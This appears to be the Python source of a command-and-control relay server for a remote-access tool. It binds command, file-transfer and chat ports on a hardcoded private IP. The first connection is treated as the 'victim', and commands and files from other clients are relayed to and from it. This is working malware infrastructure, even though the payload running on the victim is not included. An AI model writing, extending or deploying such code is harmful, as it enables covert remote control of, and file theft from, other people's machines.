import socket
import threading

format = "utf-8"

SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
CHATSERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
FILESOCKET = socket.socket()
IP = socket.gethostbyname(socket.gethostname())
COMMANDSPORT = 8080
FILESOCKETPORT = 9090
CHATPORT = 9191
IP = "192.168.1.69"
FILESOCKET.bind((IP, FILESOCKETPORT))
SERVER.bind((IP, COMMANDSPORT))
CHATSERVER.bind((IP, CHATPORT))
print(f"server on: {IP}")

#client lists
clients = []
filesocketClients = []
chatclients = []
chatNicknames = []

def broadcast(message):
    for i in clients:
        if i != clients[0]:
            i.send(message.encode(format))

def recievingCommands(sock):
    while sock != clients[0]:
        command = sock.recv(1024).decode(format)
        if "?public" in command:
            info = command.index("/") + 1
            broadcast(command[info:])
        clients[0].send(command.encode(format))


def broadcastVictimMessages():
    while True:
        message = clients[0].recv(1024).decode(format)
        if " " in message:
            sock = message[message.index(" ") + 1: message.index("/")]
        
        if "?public" in message:
            realmessageIndex = message.index("/") + 1
            broadcast(message[realmessageIndex:])
            print(message[realmessageIndex:])
        else:
            clients[chatNicknames.index(sock) + 1].send(message.encode(format))
        
def fileListener(fileSock):
    while True:
        file = filesocketClients[0].recv(8192)
        fileSock.send(file)

def fileListenerClients(fileSock):
    while True:
        file = fileSock.recv(1024)
        filesocketClients[0].send(file)

def chatListener(sock):
    while True:
        message = sock.recv(1024).decode(format)
        for i in chatclients:
            i.send(message.encode(format))


def acceptingClients():
    SERVER.listen()
    clientSock, clientIp = SERVER.accept()
    clients.append(clientSock)

    FILESOCKET.listen()
    clientFS, clientFSIP = FILESOCKET.accept()
    filesocketClients.append(clientFS)
    print(f"{clientIp} has connected!")
    victimListener = threading.Thread(target=broadcastVictimMessages).start()

    while True:
        SERVER.listen()
        clientSock, clientIp = SERVER.accept()
        clients.append(clientSock)

        FILESOCKET.listen()
        clientFS, clientFSIP = FILESOCKET.accept()
        filesocketClients.append(clientFS)
        

        commandListenner = threading.Thread(target= recievingCommands, args=(clientSock,)).start()
        filelistener = threading.Thread(target=fileListener, args=(clientFS,)).start()
        filelistenerclient = threading.Thread(target=fileListenerClients, args=(clientFS,)).start()

def chatAcceptingClients():
    while True:
        CHATSERVER.listen()
        print("listining")
        clientCS, clientCSIP = CHATSERVER.accept()
        nickname = clientCS.recv(1024).decode(format)
        chatclients.append(clientCS)
        chatNicknames.append(nickname)

        print(f"{clientCSIP} has connected with a nickname of: {nickname}!")
        chatlistener = threading.Thread(target=chatListener, args=(clientCS,)).start()


thread = threading.Thread(target=chatAcceptingClients).start()
acceptingClients()